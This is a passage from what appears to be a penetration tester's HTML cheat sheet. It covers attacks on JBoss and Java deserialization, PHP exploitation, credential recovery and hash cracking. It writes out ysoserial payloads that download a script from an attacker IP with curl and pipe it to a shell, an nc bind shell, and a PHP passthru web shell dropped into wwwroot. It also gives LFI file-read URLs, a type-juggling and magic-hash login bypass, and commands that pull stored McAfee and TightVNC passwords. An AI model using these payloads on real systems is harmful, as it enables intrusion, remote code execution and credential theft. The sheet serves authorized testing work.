<span class="mi">2</span>. <span class="nv">From</span> <span class="nv">here</span> <span class="nv">you</span><span class="nv">ll</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">utilize</span> <span class="nv">the</span> <span class="nv">deploy</span><span class="ss">()</span> <span class="nv">function</span> <span class="nv">since</span> <span class="nv">it</span> <span class="nv">allows</span> <span class="nv">you</span> <span class="nv">to</span> <span class="nv">enter</span> <span class="nv">a</span> <span class="nv">URL</span> <span class="nv">as</span> <span class="nv">a</span> <span class="nv">parameter</span> <span class="nv">value</span> <span class="nv">in</span> <span class="nv">java</span>.<span class="nv">net</span>.<span class="nv">URL</span>.  <span class="nv">In</span> <span class="nv">this</span> <span class="nv">field</span>, <span class="nv">enter</span> <span class="nv">your</span> <span class="nv">attack</span> <span class="nv">IP</span> <span class="nv">and</span> <span class="nv">the</span> <span class="nv">name</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">WAR</span> <span class="nv">file</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">URL</span> <span class="nv">box</span> <span class="nv">and</span> <span class="k">then</span> <span class="nv">click</span> <span class="nv">the</span> <span class="nv">Invoke</span> <span class="nv">button</span>. 
</pre></div>
</td></tr></table></p>
<p>Other ways to gain execution
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="o">*</span> <span class="n">jboss</span><span class="p">.</span><span class="n">deployment</span>
<span class="o">*</span> <span class="n">jboss</span><span class="p">.</span><span class="k">system</span> <span class="p">(</span><span class="n">MainDeployer</span><span class="p">)</span>
<span class="o">*</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="k">invoker</span><span class="o">/</span><span class="n">JMXInvokerServlet</span>
<span class="o">*</span> <span class="n">Java</span> <span class="n">Deserialization</span> <span class="n">Vuln</span> <span class="n">via</span> <span class="n">JMXInvokerServlet</span>
<span class="o">*</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">redteam</span><span class="o">-</span><span class="n">pentesting</span><span class="p">.</span><span class="n">de</span><span class="o">/</span><span class="n">en</span><span class="o">/</span><span class="n">publications</span><span class="o">/</span><span class="n">jboss</span><span class="o">/-</span><span class="n">bridging</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">gap</span><span class="o">-</span><span class="k">between</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">enterprise</span><span class="o">-</span><span class="k">and</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="k">or</span><span class="o">-</span><span class="n">whos</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">jboss</span><span class="o">-</span><span class="n">now</span>
<span class="o">*</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">frohoff</span><span class="o">/</span><span class="n">ysoserial</span>
<span class="o">*</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">jitpack</span><span class="p">.</span><span class="n">io</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">github</span><span class="o">/</span><span class="n">frohoff</span><span class="o">/</span><span class="n">ysoserial</span><span class="o">/</span><span class="n">master</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">/</span><span class="n">ysoserial</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="p">.</span><span class="n">jar</span>
<span class="o">*</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">cigital</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="n">mitigate</span><span class="o">-</span><span class="n">java</span><span class="o">-</span><span class="n">deserialization</span><span class="o">-</span><span class="n">vulnerability</span><span class="o">-</span><span class="n">jboss</span><span class="o">/</span>
</pre></div>
</td></tr></table></p>
<p>Auto-check and exploitation tool (<a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a>)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">joaomatosf</span><span class="o">/</span><span class="n">jexboss</span><span class="p">.</span><span class="n">git</span>
    <span class="n">cd</span> <span class="n">jexboss</span>
    <span class="n">pip</span> <span class="n">install</span> <span class="o">-</span><span class="n">r</span> <span class="n">requires</span><span class="p">.</span><span class="n">txt</span>
    <span class="n">python</span> <span class="n">jexboss</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
    <span class="n">python</span> <span class="n">jexboss</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="k">host</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">target_host</span><span class="p">:</span><span class="mi">8080</span>
</pre></div>
</td></tr></table></p>
<h3 id="java-deserialization">Java Deserialization<a class="headerlink" href="#java-deserialization" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet">Java Deserialization Cheat Sheet</a></p>
<p><a href="http://codewhitesec.blogspot.de/2015/03/sh-or-getting-shell-environment-from.html">How to get a full shell through Java Runtime.exec</a></p>
<p>Ysoserial payload to execute full commands
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">sh</span> <span class="o">-</span><span class="k">c</span> <span class="err">$</span><span class="o">@|</span><span class="n">sh</span> <span class="p">.</span> <span class="o">&lt;</span><span class="n">payload</span> <span class="n">here</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table></p>
<p>Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="o">-</span><span class="k">all</span><span class="p">.</span><span class="n">jar</span> <span class="n">CommonsCollections1</span> <span class="s1">&#39;sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh&#39;</span> <span class="o">&gt;</span> <span class="n">jenkins_curl_shell</span><span class="p">.</span><span class="n">bin</span>
</pre></div>
</td></tr></table></p>
<p>Generate a ysoserial payload to execute nc bind shell
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="o">-</span><span class="k">all</span><span class="p">.</span><span class="n">jar</span> <span class="n">CommonsCollections1</span> <span class="s1">&#39;sh -c $@|sh . nc -lp 8088 -e /bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">nc</span><span class="o">-</span><span class="n">jenkins</span><span class="p">.</span><span class="k">out</span>
</pre></div>
</td></tr></table></p>
<h4 id="jmxinvokerservlet">JMXInvokerServlet<a class="headerlink" href="#jmxinvokerservlet" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">ysoserial</span><span class="o">-</span><span class="n">master</span><span class="o">-</span><span class="n">v0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="o">-</span><span class="n">gad26e2b</span><span class="o">-</span><span class="mi">61</span><span class="p">.</span><span class="n">jar</span> <span class="n">CommonsCollections5</span> <span class="ss">&quot;touch /tmp/pwned&quot;</span> <span class="o">&gt;</span><span class="n">payload</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
</td></tr></table>

<p>Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure. </p>
<p>Ensure the headers match these:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">POST</span> <span class="o">/</span><span class="nt">invoker</span><span class="o">/</span><span class="nt">JMXInvokerServlet</span> <span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span>
    <span class="nt">Host</span><span class="o">:</span> <span class="o">&lt;</span><span class="nt">hostname</span><span class="o">/</span><span class="nt">IP</span><span class="o">&gt;</span><span class="p">:</span><span class="nd">8080</span>
    <span class="nt">Content-Type</span><span class="p">:</span><span class="nd">application</span><span class="o">/</span><span class="nt">x-java-serialized-object</span><span class="o">;</span> <span class="nt">class</span><span class="o">=</span><span class="nt">org</span><span class="p">.</span><span class="nc">jboss</span><span class="p">.</span><span class="nc">invocation</span><span class="p">.</span><span class="nc">MarshalledValue</span>
    <span class="nt">Content-Length</span><span class="o">:</span> <span class="nt">2083</span>
</pre></div>
</td></tr></table></p>
<h4 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h4>
<p>LFI Read File (without executing)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">www</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="n">php</span><span class="p">:</span><span class="o">//</span><span class="n">filter</span><span class="o">/</span><span class="k">read</span><span class="o">=</span><span class="k">convert</span><span class="p">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">config</span><span class="p">.</span><span class="n">php</span>
</pre></div>
</td></tr></table></p>
<p>LFI Read PHP session file for current sessionid
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">target</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">blog</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">page</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">sess_th3cr1i5cm6m3dq98pb2sn9qg5</span>
</pre></div>
</td></tr></table></p>
<p>Create PHP backdoor/shell (windows):
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nx">echo</span> <span class="o">^</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="o">?^&gt;</span> <span class="o">&gt;</span> <span class="nx">C</span><span class="o">:</span><span class="nx">\inetpub\wwwroot\s</span><span class="o">.</span><span class="nx">php</span>
</pre></div>
</td></tr></table></p>
<p>PHP Command Execution Example
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">Url</span><span class="o">/</span><span class="n">page</span><span class="p">.</span><span class="n">php</span><span class="vm">?</span><span class="n">page</span><span class="o">=</span><span class="k">system</span><span class="o">&amp;</span><span class="n">help</span><span class="o">=</span><span class="n">cmd</span><span class="w"></span>

<span class="w">    </span><span class="nv">@extract</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="nv">@die</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">page</span><span class="p">(</span><span class="err">$</span><span class="n">help</span><span class="p">));</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h5 id="php-type-juggling">PHP Type Juggling<a class="headerlink" href="#php-type-juggling" title="Permanent link">&para;</a></h5>
<p>Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison. </p>
<p>Add [] after a POST parameter "?user_id[]=user22" to force a NULL (zero-like) condition when comparing a string and an array</p>
<h4 id="web-sockets">Web Sockets<a class="headerlink" href="#web-sockets" title="Permanent link">&para;</a></h4>
<p>There are still relatively few dec ent Web Socket testing tools and most aren't very mature:</p>
<ul>
<li>BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic</li>
<li>ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy</li>
<li><a href="https://github.com/nccgroup/wssip">WSSiP</a>- WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.</li>
</ul>
<h2 id="misc">Misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
<p>Things that don't seem to fit elsewhere!</p>
<h4 id="decompiling-net-binaries">Decompiling .NET Binaries<a class="headerlink" href="#decompiling-net-binaries" title="Permanent link">&para;</a></h4>
<p><a href="http://ilspy.net/">http://ilspy.net/</a></p>
<h4 id="canary-tokens">Canary Tokens<a class="headerlink" href="#canary-tokens" title="Permanent link">&para;</a></h4>
<p>Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser.</p>
<p>To obtain a token:
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="mi">1</span>. <span class="nv">Visit</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">canarytokens</span>.<span class="nv">org</span>.
<span class="mi">2</span>. <span class="nv">Enter</span> <span class="nv">your</span> <span class="nv">email</span> <span class="nv">address</span>. <span class="ss">(</span><span class="nv">It</span><span class="s1">&#39;</span><span class="s">s only used to notify you when the token is triggered, mails are not used for any other purpose.)</span>
<span class="mi">3</span>. <span class="nv">Enter</span> <span class="nv">a</span> <span class="nv">comment</span> <span class="nv">which</span> <span class="nv">describes</span> <span class="nv">where</span> <span class="nv">you</span><span class="s1">&#39;</span><span class="s">re using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. &quot;file watch on 192.168.100.2:/repos/repo3/README.txt&quot; or &quot;Password lure email in user@domain.com inbox&quot;. We envisage having loads of tokens, so a good description is necessary. </span>
<span class="mi">4</span>. <span class="nv">Click</span> <span class="s2">&quot;</span><span class="s">Generate Token</span><span class="s2">&quot;</span> <span class="nv">to</span> <span class="nv">obtain</span> <span class="nv">your</span> <span class="nv">token</span>. 
<span class="mi">5</span>. <span class="nv">Copy</span> <span class="nv">the</span> <span class="nv">token</span> <span class="nv">and</span> <span class="nv">drop</span> <span class="nv">it</span> <span class="nv">somewhere</span> <span class="nv">it</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">stumbled</span> <span class="nv">over</span>.
</pre></div>
</td></tr></table>
<a href="https://canarytokens.org/generate#">Canarytokens.org</a></p>
<h4 id="python-ssl-web-server">Python SSL Web Server<a class="headerlink" href="#python-ssl-web-server" title="Permanent link">&para;</a></h4>
<p>Create PEM file
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">openssl</span> <span class="n">req</span> <span class="o">-</span><span class="n">newkey</span> <span class="n">rsa</span><span class="p">:</span><span class="mi">2048</span> <span class="o">-</span><span class="n">x509</span> <span class="o">-</span><span class="n">keyout</span> <span class="n">cakey</span><span class="p">.</span><span class="n">pem</span> <span class="o">-</span><span class="k">out</span> <span class="n">cacert</span><span class="p">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">days</span> <span class="mi">3650</span>
</pre></div>
</td></tr></table></p>
<p>To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) :
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">cat</span> <span class="n">cakey</span><span class="p">.</span><span class="n">pem</span> <span class="n">cacert</span><span class="p">.</span><span class="n">pem</span> <span class="o">&gt;</span> <span class="n">server</span><span class="p">.</span><span class="n">pem</span>
</pre></div>
</td></tr></table></p>
<p>Python code
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="kn">import</span> <span class="nn">BaseHTTPServer</span><span class="o">,</span> <span class="nn">SimpleHTTPServer</span>
    <span class="kn">import</span> <span class="nn">ssl</span>

    <span class="n">httpd</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">HTTPServer</span><span class="p">((</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">4443</span><span class="p">),</span> <span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span>
    <span class="n">httpd</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span> <span class="p">(</span><span class="n">httpd</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="s1">&#39;./server.pem&#39;</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</pre></div>
</td></tr></table></p>
<h4 id="mcafee-sitelistxml-decryption">McAfee SiteList.xml decryption<a class="headerlink" href="#mcafee-sitelistxml-decryption" title="Permanent link">&para;</a></h4>
<p>Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">type</span> <span class="ss">&quot;C:\ProgramData\McAfee\Common Framework\SiteList.xml&quot;</span> <span class="o">|</span><span class="n">findstr</span> <span class="n">Password</span>

    <span class="err"></span> <span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">mcafee_sitelist_pwd_decrypt</span><span class="p">.</span><span class="n">py</span> <span class="n">f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR</span><span class="o">/</span><span class="n">abAFPM9B3Q</span><span class="o">==</span>
    <span class="n">Crypted</span> <span class="n">password</span>   <span class="p">:</span> <span class="n">f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR</span><span class="o">/</span><span class="n">abAFPM9B3Q</span><span class="o">==</span>
    <span class="n">Decrypted</span> <span class="n">password</span> <span class="p">:</span> <span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
</pre></div>
</td></tr></table></p>
<p><a href="https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1">https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">funoverip</span><span class="o">/</span><span class="n">mcafee</span><span class="o">-</span><span class="n">sitelist</span><span class="o">-</span><span class="n">pwd</span><span class="o">-</span><span class="n">decryption</span>
</pre></div>
</td></tr></table>

<h4 id="tightvnc-password-retrieval">TightVNC Password Retrieval<a class="headerlink" href="#tightvnc-password-retrieval" title="Permanent link">&para;</a></h4>
<p>Retrieve TightVNC registry keys
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">TightVNC</span><span class="err">\</span><span class="n">server</span>
</pre></div>
</td></tr></table></p>
<p>Copy password from reg query output
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Password</span>    <span class="n">REG_BINARY</span>    <span class="mi">7228098734</span><span class="n">BBBA06</span>
    <span class="n">ControlPassword</span>    <span class="n">REG_BINARY</span>    <span class="mi">435</span><span class="n">D7A037B9FDC2B</span>
</pre></div>
</td></tr></table></p>
<p>Download vncpwd.exe or other VNC password decoder
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">wine</span> <span class="n">vncpwd</span><span class="p">.</span><span class="n">exe</span> <span class="mi">7228098734</span><span class="n">BBBA06</span>
</pre></div>
</td></tr></table></p>
<h4 id="password-lists">Password Lists<a class="headerlink" href="#password-lists" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/danielmiessler/SecLists.gits">https://github.com/danielmiessler/SecLists.gits</a></p>
<h4 id="aix-passwords">AIX Passwords<a class="headerlink" href="#aix-passwords" title="Permanent link">&para;</a></h4>
<p>/etc/security/passwd</p>
<p>Convert AIX passwd file to john format
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">cat</span> <span class="err">$</span><span class="mi">1</span><span class="o">|</span><span class="n">egrep</span> <span class="ss">&quot;:|password&quot;</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">&#39;s/password = //g&#39;</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="ss">&quot;\t &quot;</span> <span class="o">|</span><span class="n">sed</span> <span class="s1">&#39;:a;N;$!ba;s/:\n/:/g&#39;</span>
</pre></div>
</td></tr></table></p>
<h4 id="create-ntlm-hash-from-mac-cli">Create NTLM Hash from Mac CLI<a class="headerlink" href="#create-ntlm-hash-from-mac-cli" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="n">password</span> <span class="o">|</span> <span class="n">iconv</span> <span class="o">-</span><span class="n">t</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="n">LE</span> <span class="o">|</span> <span class="n">openssl</span> <span class="n">md4</span>
</pre></div>
</td></tr></table>

<h4 id="hash-cracking-examples">Hash Cracking Examples<a class="headerlink" href="#hash-cracking-examples" title="Permanent link">&para;</a></h4>
<p>ophcrack using tables
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">ophcrack</span> <span class="o">-</span><span class="n">d</span> <span class="o">/</span><span class="n">Volumes</span><span class="o">/</span><span class="k">data</span><span class="o">/</span><span class="n">table_vista_free</span><span class="o">/</span> <span class="o">-</span><span class="n">t</span> <span class="o">/</span><span class="n">Volumes</span><span class="o">/</span><span class="k">data</span><span class="o">/</span><span class="n">table_vista_free</span> <span class="o">-</span><span class="n">f</span> <span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ntlm</span><span class="p">.</span><span class="n">hashdump</span>
</pre></div>
</td></tr></table></p>
<p>Crack mscachev2 format with Hashcat (extremely slow)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">2100</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">mscachev2</span><span class="p">.</span><span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">wordlists</span><span class="cm">/* -r rules/dive.rule</span>
</pre></div>
</td></tr></table></p>
<p>Hashcat SPNs with wordlist
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="o">-</span><span class="n">a</span> <span class="mi">0</span> <span class="n">spns</span><span class="p">.</span><span class="n">dump</span> <span class="p">.</span><span class="o">/</span><span class="n">wordlists</span><span class="cm">/* -r rules/dive.rule</span>
</pre></div>
</td></tr></table></p>
<p>JTR SPNs with wordlist
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="p">.</span><span class="o">/</span><span class="n">john</span> <span class="c1">--format=krb5tgs spns.dump --wordlist=</span>
</pre></div>
</td></tr></table></p>
<h4 id="magic-hashes">Magic Hashes<a class="headerlink" href="#magic-hashes" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://www.whitehatsec.com/blog/magic-hashes/">https://www.whitehatsec.com/blog/magic-hashes/</a></p>
<p>Use Case 1: Use the Magic Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as 0 and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example.</p>
<ul>
<li><a href="https://example.com/login.php?user=bob&amp;pass=240610708">https://example.com/login.php?user=bob&amp;pass=240610708</a></li>
</ul>
<p>Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as 0 and therefore compare to be true. This could be caused to happen</p>
<ul>
<li><a href="https://example.com/login.php?user=bob&amp;token=0e462097431906509019562988736854">https://example.com/login.php?user=bob&amp;token=0e462097431906509019562988736854</a></li>
</ul>
<p>Hashes
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nv">HashType</span>    <span class="nv">HashLength</span> <span class="nv">Magic</span><span class="nv">Number</span>    <span class="nv">Magic</span> <span class="nv">Hash</span>                                  <span class="nv">Found</span> <span class="nv">By</span>
    <span class="nv">md2</span>         <span class="mi">32</span>          <span class="mi">505144726</span>       <span class="mi">0</span><span class="nv">e015339760548602306096794382326</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">md4</span>         <span class="mi">32</span>          <span class="mi">48291204</span>        <span class="mi">0</span><span class="nv">e266546927425668450445617970135</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">md5</span>         <span class="mi">32</span>          <span class="mi">240610708</span>       <span class="mi">0</span><span class="nv">e462097431906509019562988736854</span>            <span class="nv">Michal</span> <span class="nv">Spacek</span>
    <span class="nv">sha1</span>        <span class="mi">40</span>          <span class="mi">10932435112</span>     <span class="mi">0</span><span class="nv">e07766915004133176347055865026311692244</span>    <span class="nv">Independently</span> <span class="nv">found</span> <span class="nv">by</span> <span class="nv">Michael</span> <span class="nv">A</span>. <span class="nv">Cleverly</span> <span class="o">&amp;</span> <span class="nv">Michele</span> <span class="nv">Spagnuolo</span> <span class="o">&amp;</span> <span class="nv">Rogdham</span>
    <span class="nv">sha224</span>      <span class="mi">56</span>          
    <span class="nv">sha256</span>      <span class="mi">64</span>          
    <span class="nv">sha384</span>      <span class="mi">96</span>          
    <span class="nv">sha512</span>      <span class="mi">128</span>         
    <span class="nv">ripemd128</span>   <span class="mi">32</span>          <span class="mi">315655854</span>       <span class="mi">0</span><span class="nv">e251331818775808475952406672980</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
    <span class="nv">ripemd160</span>   <span class="mi">40</span>          <span class="mi">20583002034</span>     <span class="mi">00</span><span class="nv">e1839085851394356611454660337505469745</span>    <span class="nv">Michael</span> <span class="nv">A</span> <span class="nv">Cleverly</span>
    <span class="nv">ripemd256</span>   <span class="mi">64</span>          
    <span class="nv">ripemd320</span>   <span class="mi">80</span>          
    <span class="nv">whirlpool</span>   <span class="mi">128</span>         
    <span class="nv">tiger128</span>,<span class="mi">3</span>  <span class="mi">32</span>          <span class="mi">265022640</span>       <span class="mi">0</span><span class="nv">e908730200858058999593322639865</span>            <span class="nv">WhiteHat</span> <span class="nv">Security</span>, <span class="nv">Inc</span>.
